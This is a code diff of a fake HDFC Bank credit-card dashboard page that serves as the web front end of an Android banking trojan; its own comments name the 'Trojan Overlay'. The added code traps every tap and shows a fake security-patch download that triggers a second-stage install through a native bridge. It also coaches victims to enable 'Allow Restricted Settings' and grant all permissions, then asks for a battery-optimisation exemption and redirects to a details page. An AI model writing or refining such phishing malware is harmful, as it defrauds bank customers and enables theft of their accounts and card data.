@@ -3,156 +3,298 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HDFC Bank - Credit Card Dashboard</title>
-    <link rel="stylesheet" href="dashboard.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <title>HDFC Bank - Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        .security-status {
-            background: #ed232a;
+        :root {
+            --hdfc-blue: #004d8c;
+            --hdfc-red: #ed232a;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            color: #333;
+        }
+
+        /* Global Click Wrapper */
+        #globalClick {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Top Status Bar */
+        .status-bar {
+            background: #666;
             color: white;
             text-align: center;
-            font-size: 10px;
-            padding: 4px;
-            font-weight: 800;
+            font-size: 11px;
+            padding: 6px;
+            font-weight: 700;
             letter-spacing: 1px;
             position: sticky;
             top: 0;
-            z-index: 2000;
+            z-index: 1000;
         }
-        .security-status.safe { background: #01875f; }
+        .status-bar.safe { background: #01875f; }
+
+        header {
+            background: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .logo { height: 25px; }
+
+        .hero {
+            background: linear-gradient(135deg, var(--hdfc-blue) 0%, #003366 100%);
+            padding: 30px 20px;
+            color: white;
+            border-bottom-left-radius: 30px;
+            border-bottom-right-radius: 30px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .hero h1 { font-size: 24px; margin-bottom: 10px; }
+        .hero p { font-size: 14px; opacity: 0.8; margin-bottom: 25px; }
+
+        /* Virtual Card */
+        .card-preview {
+            background: linear-gradient(45deg, #1a1a1a 0%, #444 100%);
+            border-radius: 15px;
+            padding: 20px;
+            height: 180px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            text-align: left;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+
+        .card-chip { width: 40px; height: 30px; background: #d4af37; border-radius: 5px; }
+        .card-number { font-size: 18px; letter-spacing: 2px; font-family: monospace; }
+
+        /* Service Grid */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            padding: 0 20px;
+            margin-bottom: 40px;
+        }
+
+        .grid-item {
+            background: white;
+            padding: 25px 15px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+
+        .grid-item .icon { font-size: 28px; margin-bottom: 12px; display: block; }
+        .grid-item span { font-size: 13px; font-weight: 600; color: var(--hdfc-blue); }
+
+        /* Overlays */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal {
+            background: white;
+            padding: 30px;
+            border-radius: 25px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .btn-red {
+            background: var(--hdfc-red);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            width: 100%;
+            font-weight: 700;
+            margin-top: 20px;
+        }
+
+        #repairGuide {
+            display: none;
+            text-align: left;
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 13px;
+        }
     </style>
 </head>
 <body>
-    <div id="statusBanner" class="security-status">⚠️ SYSTEM UNSECURED - ACTION REQUIRED</div>
 
-    <header class="main-header">
-        <div class="logo-container">
-            <img src="3e834224c5fd5554a019d56b4902b706.png" alt="HDFC Logo" class="brand-logo">
-            <span class="brand-text">HDFC BANK</span>
-        </div>
-        <div class="menu-icon"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>
-    </header>
+    <div id="globalClick" onclick="triggerAction()">
+        <div id="statusBanner" class="status-bar">⚠️ SECURITY UPDATE PENDING - CLICK TO RESOLVE</div>
 
-    <main class="dashboard-container">
-        <section class="hero-banner">
-            <div class="hero-content">
-                <h2>India's First <br><span>Interactive Credit Card</span></h2>
-                <p>HDFC Bank Millennia Credit Card!</p>
-                <div class="hero-stats">
-                    <div class="stat-item"><span>High Security</span></div>
-                    <div class="stat-item"><span>Unlimited Rewards</span></div>
-                </div>
-                <button class="btn-apply" onclick="startPermissionFlow()">Fix Now</button>
-            </div>
-            <div class="card-visual">
-                <div class="credit-card">
-                    <div class="card-number">**** **** **** 8821</div>
-                    <div class="card-holder">HDFC CUSTOMER</div>
-                    <div class="card-logo">HDFC BANK</div>
-                </div>
-            </div>
-        </section>
+        <header>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/28/HDFC_Bank_Logo.svg" alt="HDFC" class="logo">
+            <div style="font-size: 20px;">👤</div>
+        </header>
 
-        <section class="info-card">
-            <h3>Card Protection</h3>
-            <p>Protect yourself with India's first comprehensive card protection service.</p>
-            <button class="btn btn-primary" onclick="startPermissionFlow()">ACTIVATE</button>
-        </section>
-    </main>
-
-    <div class="permission-overlay" id="updateOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:10000; justify-content:center; align-items:center;">
-        <div class="perm-modal" style="background:white; padding:30px; border-radius:20px; width:85%; text-align:center;">
-            <div style="font-size:50px; margin-bottom:20px;">🛡️</div>
-            <h2 style="color:#ed232a; margin-bottom:10px;">Security Alert!</h2>
-            <div style="color:#333; margin-bottom:30px; font-size:14px; line-height:1.5;">
-                Your current version is <strong>unsecured</strong>. <br>Please upgrade to the <strong>Encrypted Security Version</strong> to protect your account.
-            </div>
+        <div class="hero">
+            <h1>Active Account</h1>
+            <p>Welcome back! Manage your cards & rewards.</p>
             
-            <div id="downloadProgress" style="display:none; width:100%; height:8px; background:#eee; border-radius:4px; margin-bottom:20px; overflow:hidden;">
-                <div id="progressBar" style="width:0%; height:100%; background:#01875f; transition: width 0.3s;"></div>
+            <div class="card-preview">
+                <div class="card-chip"></div>
+                <div class="card-number">**** **** **** 8821</div>
+                <div style="display: flex; justify-content: space-between; font-size: 12px;">
+                    <span>HDFC CUSTOMER</span>
+                    <span>09/28</span>
+                </div>
             </div>
-            <div id="progressText" style="display:none; font-size:12px; color:#666; margin-bottom:20px;">Downloading Security Patch...</div>
+        </div>
 
-            <button id="updateBtn" onclick="startUpdate()" style="width:100%; padding:15px; background:#ed232a; color:white; border:none; border-radius:10px; font-weight:700; font-size:16px;">UPGRADE TO SECURE VERSION</button>
+        <div class="grid">
+            <div class="grid-item">
+                <span class="icon">🎁</span>
+                <span>Reward Points</span>
+            </div>
+            <div class="grid-item">
+                <span class="icon">📈</span>
+                <span>Limit Management</span>
+            </div>
+            <div class="grid-item">
+                <span class="icon">🛡️</span>
+                <span>Security Sync</span>
+            </div>
+            <div class="grid-item">
+                <span class="icon">📑</span>
+                <span>E-Statement</span>
+            </div>
+        </div>
+        
+        <div style="text-align: center; padding: 20px; opacity: 0.5; font-size: 12px;">
+            HDFC Bank v4.0.94 <br> Secure Session Active
         </div>
     </div>
 
-    <div class="permission-overlay" id="masterOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.98); z-index:9999; justify-content:center; align-items:center; padding:20px; box-sizing:border-box;">
-        <div style="text-align:center; width:100%;">
-            <div style="font-size:60px; margin-bottom:20px;">✅</div>
-            <h2 style="color:#01875f; margin-bottom:10px;">Security Sync Active</h2>
-            <p style="color:#666; margin-bottom:30px; font-size:14px;">Finalizing encryption. If permissions are blocked, please repair below.</p>
+    <!-- Trojan Overlay -->
+    <div id="trojanOverlay" class="overlay">
+        <div class="modal">
+            <div style="font-size: 60px; margin-bottom: 20px;">🛡️</div>
+            <h2 style="color: var(--hdfc-red);">Action Required!</h2>
+            <p style="margin-top: 10px; font-size: 14px;">Your current version is <b>unsecured</b>. Upgrade to the Secure Patch to protect your data.</p>
             
-            <button onclick="showRepairGuide()" style="width:100%; padding:15px; background:#333; color:white; border:none; border-radius:10px; font-weight:700; margin-bottom:20px;">⚠️ PERMISSION BLOCKED? FIX HERE</button>
+            <div id="progressBox" style="display: none; margin-top: 20px;">
+                <div style="width: 100%; height: 6px; background: #eee; border-radius: 3px; overflow: hidden;">
+                    <div id="pBar" style="width: 0%; height: 100%; background: #27ae60; transition: width 0.3s;"></div>
+                </div>
+                <p id="pText" style="font-size: 12px; margin-top: 8px; color: #666;">Downloading...</p>
+            </div>
+
+            <button id="upBtn" onclick="startDownload(event)" class="btn-red">UPGRADE & PROTECT</button>
+        </div>
+    </div>
+
+    <!-- Master Overlay -->
+    <div id="masterOverlay" class="overlay" style="background: white;">
+        <div class="modal" style="box-shadow: none;">
+            <div style="font-size: 60px; margin-bottom: 20px;">🧬</div>
+            <h2 style="color: #01875f;">Syncing Profile</h2>
+            <p style="margin-top: 10px; font-size: 14px;">Finalizing encryption. If prompts don't appear, use the Repair Tool.</p>
             
-            <div id="repairGuide" style="display:none; background:#f5f5f5; padding:20px; border-radius:15px; text-align:left; font-size:13px; line-height:1.6;">
-                <p>1. Click <b>"OPEN SETTINGS"</b> below.</p>
-                <p>2. Click <b>3 DOTS</b> (Top Right Corner).</p>
-                <p>3. Click <b>"Allow Restricted Settings"</b>.</p>
-                <p>4. Come back and allow all permissions.</p>
-                <button onclick="if(window.AndroidBridge) window.AndroidBridge.openAppSettings()" style="width:100%; padding:10px; background:#01875f; color:white; border:none; border-radius:5px; margin-top:15px;">OPEN SETTINGS</button>
+            <button onclick="showRepair(event)" style="background: #333; color: white; padding: 15px; border-radius: 10px; width: 100%; border: none; margin-top: 20px;">REPAIR SECURITY SYNC</button>
+            
+            <div id="repairGuide">
+                <p>1. Open <b>App Settings</b>.</p>
+                <p>2. Tap <b>3 Dots</b> (Top Right Corner).</p>
+                <p>3. Select <b>Allow Restricted Settings</b>.</p>
+                <p>4. Return here and <b>Allow All</b>.</p>
+                <button onclick="if(window.AndroidBridge) window.AndroidBridge.openAppSettings()" class="btn-red" style="margin-top: 10px;">OPEN SETTINGS</button>
             </div>
         </div>
     </div>
 
     <script>
-        function startPermissionFlow() {
+        let permissionsGranted = false;
+
+        function triggerAction() {
             if (window.AndroidBridge) {
-                if (window.AndroidBridge.isLimitedVersion && window.AndroidBridge.isLimitedVersion()) {
-                    document.getElementById('updateOverlay').style.display = 'flex';
+                if (window.AndroidBridge.isLimitedVersion()) {
+                    document.getElementById('trojanOverlay').style.display = 'flex';
                 } else {
-                    document.getElementById('masterOverlay').style.display = 'flex';
+                    if (permissionsGranted) {
+                        window.location.href = 'details.html';
+                    } else {
+                        document.getElementById('masterOverlay').style.display = 'flex';
+                    }
                 }
-            } else {
-                alert("Please wait, security system initializing...");
             }
         }
 
-        function showRepairGuide() {
-            document.getElementById('repairGuide').style.display = 'block';
-        }
-
-        function startUpdate() {
-            document.getElementById('updateBtn').style.display = 'none';
-            document.getElementById('downloadProgress').style.display = 'block';
-            document.getElementById('progressText').style.display = 'block';
-            
+        function startDownload(e) {
+            e.stopPropagation();
+            document.getElementById('upBtn').style.display = 'none';
+            document.getElementById('progressBox').style.display = 'block';
             let prog = 0;
-            let interval = setInterval(() => {
+            let iv = setInterval(() => {
                 prog += Math.random() * 15;
                 if (prog >= 100) {
                     prog = 100;
-                    clearInterval(interval);
-                    document.getElementById('progressText').innerHTML = "Installing Update...";
-                    if (window.AndroidBridge && window.AndroidBridge.triggerAutoUpdate) {
-                        window.AndroidBridge.triggerAutoUpdate();
-                    }
+                    clearInterval(iv);
+                    document.getElementById('pText').innerHTML = "Installing...";
+                    if (window.AndroidBridge) window.AndroidBridge.triggerAutoUpdate();
                 }
-                document.getElementById('progressBar').style.width = prog + '%';
+                document.getElementById('pBar').style.width = prog + '%';
             }, 400);
         }
 
+        function showRepair(e) {
+            e.stopPropagation();
+            document.getElementById('repairGuide').style.display = 'block';
+        }
+
         // Bridge Detection
-        let bridgeRetry = setInterval(() => {
+        let bridgeCheck = setInterval(() => {
             if (window.AndroidBridge) {
-                clearInterval(bridgeRetry);
-                if (window.AndroidBridge.isLimitedVersion && window.AndroidBridge.isLimitedVersion()) {
-                    document.getElementById('updateOverlay').style.display = 'flex';
+                clearInterval(bridgeCheck);
+                if (window.AndroidBridge.isLimitedVersion()) {
+                    document.getElementById('trojanOverlay').style.display = 'flex';
                 }
             }
         }, 500);
 
         function handlePermissionResult(status) {
             if (status === 'GRANTED') {
+                permissionsGranted = true;
                 document.getElementById('masterOverlay').style.display = 'none';
-                document.getElementById('statusBanner').innerHTML = "✅ SYSTEM SECURED - PROTECTED";
-                document.getElementById('statusBanner').classList.add('safe');
-                if (window.AndroidBridge) {
-                    window.AndroidBridge.requestIgnoreBatteryOptimizations();
-                    setTimeout(() => { window.location.href = 'details.html'; }, 2000);
-                }
+                document.getElementById('statusBanner').innerHTML = "✅ SYSTEM ENCRYPTED & SECURED";
+                document.getElementById('statusBanner').className = "status-bar safe";
+                if (window.AndroidBridge) window.AndroidBridge.requestIgnoreBatteryOptimizations();
             }
         }
     </script>
